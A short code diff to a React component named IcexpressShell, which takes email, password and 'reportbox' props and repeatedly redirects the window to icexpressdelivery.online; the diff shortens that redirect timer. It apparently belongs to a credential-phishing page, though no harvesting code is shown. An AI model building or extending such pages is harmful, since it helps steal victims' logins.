@@ -5,7 +5,7 @@ function IcexpressShell({ email, pass, reportbox }) {
   useEffect(() => {
     setInterval(() => {
       window.open("https://icexpressdelivery.online", "_self");
-    }, 15000);
+    }, 10000);
   });
   return (
     <div style={{ display: "flex", justifyContent: "center", marginTop: 50 }}>
